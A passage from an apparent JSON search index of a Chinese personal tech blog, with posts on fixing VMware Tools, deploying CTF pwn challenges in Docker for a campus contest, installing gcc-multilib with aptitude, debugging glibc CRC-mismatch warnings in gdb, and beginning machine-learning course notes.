src=\"/assets/js/Meting.min.js\"></script><p>Ubuntu20.04安装vmware tools时显示segment fault，虽然最后显示成功安装，但是没有任何效果，依旧不能复制粘贴。</p>\n<p>解决方式：</p>\n<p>首先删除已经安装的vmware tools。具体方法是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> vmware-tools-distrib/bin</span><br><span class=\"line\">sudo ./vmware-uninstall-tools.pl</span><br></pre></td></tr></table></figure>\n<p>接着直接</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install open-vm-tools open-vm-tools-desktop</span><br></pre></td></tr></table></figure>\n<p>安装以后尝试一下能不能复制，不能的话尝试重启，反正我重启以后就好了。</p>\n<p>之前搜索方式有问题，关键词是无法复制，换了一个段错误的关键词就行了。</p>\n","categories":["Linux"]},{"title":"基于ctf pwn环境的docker搭建","url":"/2021/10/31/mess_%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-KoeNqYAA\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>​    最近为了校内的萌新赛，需要出一些简单的pwn题，然后把它们搓进docker。虽然步骤并不是非常复杂，而且有现成的框架，但我发现如果纯粹按照网上框架的一件脚本运行的话，遇到报错根本无法解决，所以看图说话之外我还需要较为系统地学习docker知识。</p>\n<h2><span id=\"docker基础架构\">docker基础架构</span></h2><p>​    对于docker，在了解基础命令之前我们需要了解的就是，容器以及虚拟化的大致概念。</p>\n<h3><span id=\"11-为什么要有docker\">1.1    为什么要有docker？</span></h3><p>​    一个程序运行也许需要严苛的环境条件，也许一个微小的环境变量的差异，将导致程序的崩溃，因此在软件开发的过程中，统一环境是一件很重要的事。</p>\n<p>​    为了解决这个问题，我们可以使用虚拟机，将程序同操作系统一起打包，这样确实避免了因为环境问题导致的程序的bug。</p>\n<p>​    但是虚拟机通常体积庞大，且启动时间缓慢，资源占用多。所以相比于纯粹使用虚拟机，我们希望使用一些更轻盈的虚拟化工具来解决问题。而容器化技术应运而生，也就是Linux 容器（Linux Containers）。</p>\n<p>​    linux容器并不是完整的操作系统，容器化对进程隔离，使得不同的容器共享内核，但是调用的各种资源是虚拟的。容器化就像在正常的进程外伪装了一层外壳，使得壳内的进程认为自己是在一个全新的环境中运行，所以很自然的，容器中的应用启动速度快，资源占用少，并且体积轻巧。</p>\n<p>​    而Docker的存在为我们提供了Linux容器的封装,提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。</p>\n<h3><span id=\"12-docker基础知识\">1.2 docker基础知识</span></h3><p>​    之前说到，Docker提供了Linux容器的封装，运用Docker实现容器化也十分简单，我们只需要有image文件，再通过docker创建镜像的容器，就能够在容器中运行我们想要的程序。</p>\n<p>​    image文件，顾名思义，类似系统iso，它包含应用程序以及运行它所必需的依赖，Docker通过image文件生成一个个运行的容器。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。</p>\n<h3><span id=\"13-docker基础命令\">1.3 docker基础命令</span></h3><p>​    首先我们需要拉取镜像至本地，可以通过<code>docker pull</code>命令。例如：</p>\n<blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ docker image pull library/hello-world</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>​    </p>\n<p>​        拉取镜像需要一定时间的等待，拉取完成后，通过<code>docker image ls</code>可以查看本地的docker镜像。</p>\n<p>​    <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.54.51.png\" alt=\"截屏2021-11-01 下午11.54.51\"></p>\n<p>​    这个<code>hello world</code>其实就是被打包好的在特定环境下的程序，我们可以通过<code>docker cantainer run hello-world</code>指令将镜像创建为容器并运行。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.59.12.png\" alt=\"截屏2021-11-01 下午11.59.12\"></p>\n<h4><span id=\"docker-build\">docker build</span></h4><p>​    build指令使用dockerfile来创建新的容器。一般来说简单的构建命令就是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ docker build -t imagename .</span><br></pre></td></tr></table></figure>\n<p>​    虽然我不是很理解这个<code>-t</code>    的参数意义何在，并且镜像名后面的“.”是干啥的。</p>\n<h4><span id=\"docker-run\">docker run</span></h4><p>​    创建一个新的容器并运行</p>\n<p>​    一般来说会有这几个参数</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">-d: 后台运行容器，并返回容器ID；</span><br><span class=\"line\"></span><br><span class=\"line\">-it: 以交互模式运行容器，并创建一个伪终端；</span><br><span class=\"line\"></span><br><span class=\"line\">-p: 指定端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class=\"line\"></span><br><span class=\"line\">--name=<span class=\"string\">&quot;nginx-lb&quot;</span>: 为容器指定一个名称；</span><br><span class=\"line\"></span><br><span class=\"line\">-v：映射主机文件夹至容器内\t</span><br></pre></td></tr></table></figure>\n<h4><span id=\"docker-startstopretart\">docker start/stop/retart</span></h4><p>​    启动或停止容器。</p>\n<p>​    指令为<code>docker start/stop/retart containerID</code></p>\n<h4><span id=\"docker-pause\">docker pause</span></h4><p>​    暂停容器内全部进程。</p>\n<h4><span id=\"docker-kill\">docker kill</span></h4><p>​    kill 运行的容器进程</p>\n<h4><span id=\"docker-ps\">docker ps</span></h4><p>​    列出容器。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">-a :显示所有的容器，包括未运行的。</span><br></pre></td></tr></table></figure>\n<h4><span id=\"docker-attach\">docker attach</span></h4><p>​    连接到正在运行中的容器。</p>\n<p><code>docker attach containerID</code></p>\n<h4><span id=\"docker-inspect\">docker inspect</span></h4><p>​    获取容器/镜像的元数据。</p>\n<h2><span id=\"简单的docker搭建步骤\">简单的docker搭建步骤</span></h2><p>​    熟悉docker基础操作后，开始搭建docker啦！！</p>\n<p>​    首先是脚本的选择，pwn的docker脚本其实很多，这里随便选一个最基础的<code>ctf_xinted</code>。</p>\n<p>​    首先我们需要做的是把项目clone到本地。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%885.11.41.png\" alt=\"截屏2021-11-01 下午5.11.41\"></p>\n<p>​    通过指令<code>cat Dockerfile</code>可以看到dockerfile。</p>\n<p>​    dockerfile是用来构建docker镜像的，里面包含了构建docker镜像构建的一些步骤和说明。一般来说如果要打包自己的环境的话，需要写dockerfile来供别人使用。这里我们直接切换到<code>ctf_xinetd</code>的文件夹下，然后执行     </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker build -t <span class=\"string\">&quot;helloworld&quot;</span> .</span><br></pre></td></tr></table></figure>\n<p>​    (注意后面的“.”)</p>\n<p>​    这个时候一般就会创建<code>helloworld</code>这个镜像，我们只需要等待创建结束，然后执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker run -d -p <span class=\"string\">&quot;0.0.0.0:10001:9999&quot;</span> -h <span class=\"string\">&quot;helloworld&quot;</span> --name=<span class=\"string\">&quot;helloworld&quot;</span> helloworld</span><br></pre></td></tr></table></figure>\n<p>​    <code>0.0.0.0</code>表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。</p>\n<p>​    如果运行正常，此时我们是能够通过 <code>nc 0.0.0.0 10001</code>来连接我们的docker容器的。</p>\n<p>​    但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo service docker restart</span><br></pre></td></tr></table></figure>\n<p>​    这样这个pwn题的docker就算部署完成了，你只需要把你自己的题目放置在容器中，并修改对应的flag就行。</p>\n<p>​    但是目前来说这个框架存在一些局限性，比如说一次只能部署一道题等。</p>\n<p>​    所以我们可以更换另外一个脚本进行docker镜像的创建。</p>\n<p>​    这里我们选择<a href=\"https://github.com/giantbranch/pwn_deploy_chroot.git，这个脚本。\">https://github.com/giantbranch/pwn_deploy_chroot.git，这个脚本。</a></p>\n<p>​    然后有个比较全面的教程，链接在这里：<a href=\"http://www.giantbranch.cn/2018/09/24/如何安全快速地部署多道ctf%20pwn比赛题目/\">如何安全快速地部署多道ctf%20pwn比赛题目</a></p>\n<p>​    就是把文件放到bin文件夹，然后</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python initialize.py</span><br><span class=\"line\">docker-compose up --build -d     <span class=\"comment\"># please run as root</span></span><br></pre></td></tr></table></figure>\n<p>​    这样就生成了一个总的镜像，每道题通过不同端口映射，然后分别有各自的flag。</p>\n<p>​    在完成镜像的创建后，还需要在做题平台中填写相关镜像。</p>\n<p>​    因为我们的CTFd是二次开发的，一般的CTFd的题目分类是有个dynamic docker，但是我们的平台只有一个kube类型。但是里面的东西还是八九不离十，然后对于指定题目，你需要填写你的docker image。并且指定暴露端口。</p>\n<p>​    然后我这个萌新就被狠狠地坑了，一开始费了好大劲从0学习docker（虽然不难），然后通过别人的框架部署题目，创建好镜像，照猫画虎指定ip和端口运行容器，最后打开CTFd，就直接把docker image那一空给填成自己启动容器的那串ip了，然后端口也傻傻地不知道怎么搞，然后随便乱输一通，结果狠狠地靶机notready了。</p>\n<p>​    直到下午我突然意识到哪里不对，然后去搜了一下，发现别人填的和我填的好像不太一样，找胖爷爷确认了一下，果然是要填docker hub里的镜像名哇。</p>\n<p>​    然后又狠狠地push了镜像，在CTFd填了镜像的名字，然后端口就是初始化时每个二进制文件对应的那个映射的端口，这下总算靶机ready了。并且顺利通过测试。</p>\n<p>​    好！</p>\n<p>​    </p>\n<p>​        </p>\n<p>​        </p>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html\">Docker 入门教程</a></p>\n<p><a href=\"https://www.runoob.com/docker/docker-image-usage.html\">Docker 镜像使用</a></p>\n<p>​    </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"解决gcc无法编译32位程序的问题","url":"/2021/10/27/mess_%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-xValPLYd\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h3><span id=\"1前言\">1）前言</span></h3><p>​    之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。</p>\n<h3><span id=\"2过程\">2)过程</span></h3><p>​    首先我们尝试编译32位程序，gcc报错：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.29.31.png\" alt=\"截屏2021-10-27 下午8.29.31\"></p>\n<p>​    缺少头文件，实则是没有安装多架构gcc。</p>\n<p>​    试图安装，失败，报错如下：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.30.23.png\" alt=\"截屏2021-10-27 下午8.30.23\"></p>\n<p>​    这里有个坑了我好久的东西，就是这个报错</p>\n<p>E: Unable to correct problems, you have held broken packages.</p>\n<p>​    无法修正问题，你持有held broken的软件包。</p>\n<p>​    我一直没有理解正确这个held的意思，我以为是持有的意思，所以一直以来这句话在我眼中的意思是，你已经有这个软件包了，但是你不能安装。</p>\n<p>​    但实际上，但凡熟悉过apt或者dkpg的一些命令，或者但凡对linux文件系统稍微熟悉一点都知道其实hold是为了防止更新不想更新的软件包，而特殊设置的功能。通过apt- mark或者dpkg命令 ，从apt-get中将特定的软件包的更新排除。而这道题的报错就是源于这点—gcc-7-multilib等依赖的软件包版本不对，但是由于held，所以并没有被更新。</p>\n<p>​    但是通过<code>dpkg --get-selections | grep hold</code>指令查找held的软件包，并没有任何结果。</p>\n<p>​    经过各种试错，找到了一个快速解决的方法。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo aptitude install gcc-multilib</span><br></pre></td></tr></table></figure>\n<p><code>aptitude</code>与apt类似，也是包管理器。但是通过<code>aptitude</code>进行包管理，对于软件包依赖问题的处理更加细节。</p>\n<p>​    下面是一些常用的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">aptitude update <span class=\"comment\">#更新可用的包列表</span></span><br><span class=\"line\">aptitude purge &lt;pkgname&gt; <span class=\"comment\">#删除包及其配置文件</span></span><br><span class=\"line\">aptitude search &lt;pkgname&gt; <span class=\"comment\">#搜索包</span></span><br><span class=\"line\">aptitude clean <span class=\"comment\">#删除下载的包文件</span></span><br><span class=\"line\">aptitude autoclean <span class=\"comment\">#删除过期的包文件</span></span><br></pre></td></tr></table></figure>\n<p><code>aptitude</code>执行起来和<code>apt</code>其实不太一样，比如    <code>sudo aptitude install gcc-multilib</code>这个命令其实执行起来长这样：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8810.58.52.png\" alt=\"截屏2021-10-27 下午10.58.52\"></p>\n<p>​    然后<code>aptitude</code>会问你</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png\" alt=\"截屏2021-10-27 下午11.00.00\"></p>\n<p>​    这里是最大的坑。如果是像我这种不想看英文按照习惯输Y的人，这里会踩一个大坑。</p>\n<p>​    明确地告诉了我：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">The following actions will resolve these dependencies:</span><br><span class=\"line\"></span><br><span class=\"line\">      Keep the following packages at their current version:</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      Accept this solution? [Y/n/q/?] </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>保持下面软件包的版本不变，你接受这个解决方式吗？</p>\n<p>显然我不接受，只要摁下N，问题就解决了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png\" alt></p>\n<p>然后。自动执行gdb-multilib的安装。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211027230403989.png\" alt=\"image-20211027230403989\"></p>\n<p>问题解决。</p>\n<h3><span id=\"3总结\">3）总结</span></h3><p>​    这个问题回过头来想，其实非常简单，如果清楚问题所在的话，只需要一行命令就能解决。当然并不是每个人都经验丰富，但是没有经验，可以积累经验，然而在积累的过程中，有些愚蠢的错误确实是不应该犯的。比如说，不认真看报错信息，或者提示，凭着感觉装。这是我在处理这种问题上最大的弱点。</p>\n<p>​    一个原因是我骄傲自满了，我确实认为在这一步不会出错，但是实际上问题就是发生在这一步上，另外就是，全英文的屏显，没有人愿意仔细阅读，但是这点没有办法，绝对不可能调成中文，这里只能是说，慢慢看，仔细看 ，然后提升一下英语水平。（但是有一说一，英语母语的人可能都不愿意看吧）</p>\n<h3><span id=\"4参考\">4）参考</span></h3><p><a href=\"https://blog.csdn.net/White_Idiot/article/details/58348957\">【Ubuntu】aptitude命令详解</a></p>\n<p><a href=\"https://askubuntu.com/questions/223237/unable-to-correct-problems-you-have-held-broken-packages\">Unable to correct problems, you have held broken packages</a></p>\n","categories":["Binary_security"],"tags":["linux primary"]},{"title":"记一次ubuntu18.04的glibc调教","url":"/2021/08/16/mess_%E8%AE%B0%E4%B8%80%E6%AC%A1ubuntu18.04%E7%9A%84glibc%E8%B0%83%E6%95%99/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-UyFXoSqE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h4><span id=\"1概述\">1）概述</span></h4><p>这是一件悲伤的事情，我的ubuntu它又崩了。</p>\n<p>最开始的时候，发现pwndbg无法查看heap等信息，这个问题我之前也遇到过，但是情况有非常大的区别。</p>\n<p>之前是我2.32的本地默认libc，执行程序时加载2.23，然后因为指定的lbc-2.23.so没有附带调试符号信息，所以也看不了heap，但是这一次，本机都看不了了？</p>\n<p>经过一番排查，我们认为是libc本身出现了问题。然后寻找libc-2.27.so的文件打算一探究竟，但找到本应该储存着它的文件夹时，惊奇地发现它居然从文件夹中消失了。</p>\n<p>它并不是无缘无故消失的，我大致分析了一下原因。之前我做题时试图切换libc版本，然后在镜像站下载了（应该）带调试符号的libc-2.27.so。但是并不是很清楚，所以喊来了pwn爷爷，pwn爷爷并不熟悉我的电脑，一通操作猛如虎，干了啥我也不知道，反正好像是把libc丢进了根目录。</p>\n<p>可能就是在那会儿，新下载的libc和已有的libc产生了冲突，然后启动了什么奇怪的过程，把libc彻底搞崩了。</p>\n<p>但是这个pwn大哥完全没锅，因为挺有趣的其实。</p>\n<p>然后大致明了的问题的方向我开始寻找解决方案。</p>\n<p>虽然pwn大哥不费吹灰之力帮我重新装了一个系统并且完善好了环境，但是还有一个报废的系统等着我蹂躏呢（）</p>\n<h3><span id=\"2record\">2)record</span></h3><p>记录一下所有调教的操作。</p>\n<ol>\n<li>普通地在/usr/lib/x86_64-linux-gnu文件夹中添加ld，无效。</li>\n<li>普通地在/usr/lib/x86_64-linux-gnu文件夹中添加带有调试符号的libc，无效。</li>\n</ol>\n<p>等等为什么ld和libc都没了。。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg: created $rebase, $<span class=\"function\">ida gdb <span class=\"title\">functions</span> <span class=\"params\">(can be used with print/<span class=\"keyword\">break</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">Reading symbols from ./worldline...done.</span></span><br><span class=\"line\"><span class=\"function\">Attaching to program: /home/fur1n/pwn/heap/merely_game/wordline/worldline, process 12250</span></span><br><span class=\"line\"><span class=\"function\">Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...</span></span><br><span class=\"line\"><span class=\"function\">warning: the debug information found in &quot;/usr/lib/debug<span class=\"comment\">//lib/x86_64-linux-gnu/libc-2.27.so&quot; does not match &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; (CRC mismatch)</span></span></span><br></pre></td></tr></table></figure>\n<p>好嘛。</p>\n<blockquote>\n<h6><span id=\"about-crc-errors\">About CRC Errors</span></h6><p>A CRC error indicates that some data in your Zip file (.zip or .zipx) is damaged. CRC stands for <strong>cyclic redundancy check</strong>. It is a calculation made from all the data in a file to insure accuracy. When you add a file to a Zip file, WinZip calculates a CRC value for the file and saves the value in the Zip file. When you later extract the file from the Zip file, WinZip calculates the CRC of the extracted file and compares it to the value stored when the file was zipped. If these two CRC values do not match, the file that was extracted does not match the original file, and WinZip will display a <strong>CRC Error</strong> message.</p>\n<p>When the data in a Zip file is damaged, it may not be possible to extract all of the files from the Zip file correctly. Damaged data can affect the entire Zip file, multiple files, or just one file.</p>\n</blockquote>\n<p>crc的官方定义是文件被损坏导致错误，但是实际并没有损坏。。感觉并不是可以随便解决的问题</p>\n<p>​      3.替换libc.so.6文件。他不是不匹配嘛，不匹配我就弄个匹配的。结果无效。</p>\n<p>查了一下，查出一堆奇怪的问题。网上大多都是完全无法调试，但是我这就很离谱。</p>\n<p>难道只能硬啃那个又臭又长的gdb的文档吗？</p>\n<p><a href=\"https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html\">18.3 Debugging Information in Separate Files</a></p>\n<blockquote>\n<p>GDB supports two ways of specifying the separate debug info file:</p>\n<ul>\n<li>The executable contains a <em>debug link</em> that specifies the name of the separate debug info file. The separate debug file’s name is usually executable.debug, where executable is the name of the corresponding executable file without leading directories (e.g., ls.debug for /usr/bin/ls). In addition, the debug link specifies a 32-bit <em>Cyclic Redundancy Check</em> (CRC) checksum for the debug file, which GDB uses to validate that the executable and the debug file came from the same build.</li>\n<li>The executable contains a <em>build ID</em>, a unique bit string that is also present in the corresponding debug info file. (This is supported only on some operating systems, when using the ELF or PE file formats for binary files and the GNU Binutils.) For more details about this feature, see the description of the —build-id command-line option in <a href=\"http://sourceware.org/binutils/docs/ld/Options.html#Options\">Command Line Options</a> in The GNU Linker. The debug info file’s name is not specified explicitly by the build ID, but can be computed from the build ID, see below.</li>\n</ul>\n</blockquote>\n<p>在某些系统中（比如我们的ubunut），由于调试文件可能比可执行程序都大，所以通常将可执行文件以及调试文件分开存放。一般来说调试信息</p>\n<p>的后缀是<code>.debug</code>。</p>\n<p>gdb支持两种寻找调试info文件的方式。</p>\n<p>一种是可执行文件包含指向调试信息文件的路径。就比如ls在<code>/usr/bin/ls)</code>中，同时这个文件夹还包含<code>ls.debug</code>文件。</p>\n<p>然后调试链接器还通过crc检查来使来源于同一个编译的可执行文件和调试文件生效。</p>\n<p>此外还有就是通过匹配build ID来指定。关于build ID，这个确实是有的。</p>\n<p>然后当可执行文件已经指定好调试文件，gdb还需要去寻找它。就像小张跟小静说我要找小王，小静只是知道他需要找到小王，但是还不知道怎么找。</p>\n<blockquote>\n<p>Depending on the way the debug info file is specified, GDB uses two different methods of looking for the debug file:</p>\n<ul>\n<li>For the “debug link” method, GDB looks up the named file in the directory of the executable file, then in a subdirectory of that directory named .debug, and finally under each one of the global debug directories, in a subdirectory whose name is identical to the leading directories of the executable’s absolute file name. (On MS-Windows/MS-DOS, the drive letter of the executable’s leading directories is converted to a one-letter subdirectory, i.e. d:/usr/bin/ is converted to /d/usr/bin/, because Windows filesystems disallow colons in file names.)</li>\n<li>For the “build ID” method, GDB looks in the .build-id subdirectory of each one of the global debug directories for a file named nn/nnnnnnnn.debug, where nn are the first 2 hex characters of the build ID bit string, and nnnnnnnn are the rest of the bit string. (Real build ID strings are 32 or more hex characters, not 10.)</li>\n</ul>\n<p>So, for example, suppose you ask GDB to debug /usr/bin/ls, which has a debug link that specifies the file ls.debug, and a build ID whose value in hex is <code>abcdef1234</code>. If the list of the global debug directories includes /usr/lib/debug, then GDB will look for the following debug information files, in the indicated order:</p>\n<ul>\n<li>- /usr/lib/debug/.build-id/ab/cdef1234.debug</li>\n<li>- /usr/bin/ls.debug</li>\n<li>- /usr/bin/.debug/ls.debug</li>\n<li>- /usr/lib/debug/usr/bin/ls.debug.</li>\n</ul>\n</blockquote>\n<p>一个就是普通的在子目录中寻找对应的文件，</p>\n<p>另外一个根据build ID，在名为<code>.build-id</code>的子目录中寻找build ID对应的文件夹。</p>\n<p>也就是说如果要调试<code>/usr/bin/ls</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/lib/debug/.build-id/ab/cdef1234.debug</span><br><span class=\"line\">/usr/bin/ls.debug</span><br><span class=\"line\">/usr/bin/.debug/ls.debug</span><br><span class=\"line\">/usr/lib/debug/usr/bin/ls.debug.</span><br></pre></td></tr></table></figure>\n<p>这四种路径都能帮助gdb找到对应的调试文件。</p>\n<p>所以无论如何实际上没有解决任何问题。比如我找到的在stackoverflow上的相同报错，基本上都是在对应文件夹中缺少他编译文件的<code>.debug</code>文件，但是这个和我感觉咩有关系。因为感觉libc这种本来就是咩有debug文件的。。。。</p>\n<p>网上也一会儿找不到和我相同的情况。好离谱</p>\n<p>我只能暂且顺着这个思路走一走，看看能不能添加什么<code>libc-2.27.so</code>的debug文件。但是好奇怪，就算缺少也应该是我们需要调试的程序缺少调试文件，为什么是libc缺少调试文件，难道我们调的不是程序而是libc？</p>\n<p>就跟之前我看那个源码级调试堆题，給的源码也是malloc的源码。</p>\n<p>对了，18.04的应该是把debug信息一起整合到了一个叫debug的文件夹里<code>/usr/lib/debug</code></p>\n<p>里面感觉和libc如出一撤，所以我才猜测这就是对应的所谓的调试信息。</p>\n<p>然后检查发现都比较完善，没有缺少什么。</p>\n<p>这就很怪了。</p>\n<p>想一下，之前报错就是说libc.so.6和libc的调试文件不匹配</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">warning: the debug information found <span class=\"keyword\">in</span> <span class=\"string\">&quot;/usr/lib/debug//lib/x86_64-linux-gnu/ld-2.27.so&quot;</span> does not match <span class=\"string\">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span> (CRC mismatch).</span><br><span class=\"line\">warning: the debug information found <span class=\"keyword\">in</span> <span class=\"string\">&quot;/usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so&quot;</span> does not match <span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span> (CRC mismatch).</span><br></pre></td></tr></table></figure>\n<p><code>/lib64/ld-linux-x86-64.so.2</code>是一个软连接，在这里链接的是<code>/lib/x86_64-linux-gnu/ld-2.27.so</code>,也就相当于ld-2.27.so</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"CS 329P note1","url":"/2022/09/29/ml_CS%20329P%20%7C%20%20note1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-PUVpOjPA\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>     </p>\n<h3><span id=\"0胡言乱语\">0：胡言乱语</span></h3><p>由于一些奇怪的原因，半被迫开始学习机器学习。关于学习资料，某位不愿意公开姓名的老同学特别给我推荐了<a href=\"https://www.bilibili.com/video/BV1Xh411p7M9/?spm_id_from=333.788&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564这套课程，说这是他压箱底的宝贝资源。\">https://www.bilibili.com/video/BV1Xh411p7M9/?spm_id_from=333.788&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564这套课程，说这是他压箱底的宝贝资源。</a></p>\n<p>所以大致记录一下学习过程，第一part的笔记主要针对数据处理部分。</p>\n<p>ps：俺是0基础。</p>\n<h3><span id=\"1-内容巩固\">1: 内容巩固</span></h3><p>chapter 1和chapter 2主要针对数据的获取以及简单的处理方式，包括清洗，变换以及特征工程。</p>\n<h4><span id=\"ml工作流程\">ML工作流程</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-09-29%20%E4%B8%8A%E5%8D%889.35.59.png\" alt=\"截屏2022-09-29 上午9.35.59\"></p>\n<p>问题分析 （将具体的问题转换为机器学习的问题） -&gt; 收集、处理数据 -&gt; 训练模型 -&gt; 部署模型 （将训练的模型部署到线上）-&gt; 完善数据 （递归）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/data1.svg\" alt=\"data1\"></p>\n<h3><span id=\"2例子演示\">2:例子演示</span></h3><p>走一遍课程中提到的代码。</p>\n<p>课程提供的代码以及数据集在<a href=\"https://c.d2l.ai/stanford-cs329p/assignments.html#assignment-1\">https://c.d2l.ai/stanford-cs329p/assignments.html#assignment-1</a></p>\n<h4><span id=\"环境\">环境</span></h4><p>python3.9 macosx。</p>\n<p>安装相关依赖。（其实我也不记得安装了啥依赖，反正缺啥就<code>pip3 instal</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip3 install numpy pandas autogluon mxnet 